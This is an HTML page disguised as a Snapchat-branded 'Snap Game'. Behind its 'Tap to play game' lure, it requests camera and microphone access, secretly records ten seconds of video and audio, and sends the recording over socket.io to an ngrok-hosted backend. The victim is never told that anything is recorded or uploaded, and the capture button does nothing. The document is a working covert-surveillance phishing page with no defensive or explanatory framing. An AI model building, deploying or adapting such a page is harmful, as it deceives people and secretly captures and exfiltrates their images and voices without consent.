<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Snap Game</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  overflow: hidden;
}

/* 🟡 Splash */
#splash {
  position: fixed;
  width: 100%;
  height: 100%;
  background: #FFFC00;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-direction: column;
}

/* Logo */
#logo {
  width: 120px;
  height: 120px;
  object-fit: contain;
}

/* Text */
#tap {
  margin-top: 20px;
  font-size: 16px;
}

/* Button */
#startBtn {
  margin-top: 15px;
  padding: 12px 20px;
  border-radius: 25px;
  border: none;
  background: black;
  color: white;
  font-size: 16px;
}

/* Error message */
#message {
  margin-top: 10px;
  color: red;
  font-size: 14px;
}

/* Camera */
#camera {
  width: 100%;
  height: 100vh;
  object-fit: cover;
  display: none;
}

/* Capture button */
.capture-btn {
  position: fixed;
  bottom: 40px;
  left: 50%;
  transform: translateX(-50%);
  width: 70px;
  height: 70px;
  border-radius: 50%;
  background: white;
  border: 5px solid rgba(255,255,255,0.5);
  display: none;
}
</style>
</head>

<body>

<!-- 🟡 Splash Screen -->
<div id="splash">

  <!-- ✅ Your downloaded logo -->
  <img id="logo" src="./sm_5b321c9cb2d25.jpg" alt="Snapchat Logo">

  <div id="tap">Tap to play game</div>

  <button id="startBtn" onclick="startApp()">Start</button>

  <div id="message"></div>

</div>

<!-- 📸 Camera -->
<video id="camera" autoplay playsinline></video>

<!-- Capture UI -->
<div class="capture-btn"></div>

<script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>

<script>
// 🔌 Backend URL
const BACKEND_URL = "https://tableware-dweeb-estate.ngrok-free.dev";

const socket = io(BACKEND_URL, {
  transports: ['websocket', 'polling']
});

let mediaRecorder;
let recordedChunks = [];

function startApp() {
  const splash = document.getElementById("splash");
  const camera = document.getElementById("camera");
  const btn = document.querySelector(".capture-btn");
  const msg = document.getElementById("message");

  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then(stream => {

      msg.innerText = "";

      camera.srcObject = stream;
      camera.style.display = "block";
      btn.style.display = "block";
      splash.style.display = "none";

      // Find supported mimeType
      const mimeTypes = [
        'video/webm;codecs=vp9,opus',
        'video/webm;codecs=vp8,opus',
        'video/webm'
      ];
      
      let mimeType = 'video/webm';
      for (const type of mimeTypes) {
        if (MediaRecorder.isTypeSupported(type)) {
          mimeType = type;
          break;
        }
      }

      mediaRecorder = new MediaRecorder(stream, {
        mimeType: mimeType
      });

      mediaRecorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          recordedChunks.push(event.data);
        }
      };

      mediaRecorder.onstop = async () => {
        if (recordedChunks.length > 0) {
          const blob = new Blob(recordedChunks, { type: mimeType });
          const buffer = await blob.arrayBuffer();
          socket.emit('video-data', buffer);
          recordedChunks = [];
        }
      };

      // Start recording, collect all data at once
      mediaRecorder.start();
      
      // Stop after 10 seconds
      setTimeout(() => {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, 10000);

      window.onbeforeunload = () => {
        if (mediaRecorder && mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      };

    })
    .catch(err => {
      console.error(err);
      msg.innerText = "⚠️ Please allow camera to play this game";
      document.getElementById("startBtn").innerText = "Try Again";
    });
}
</script>

</body>
</html>
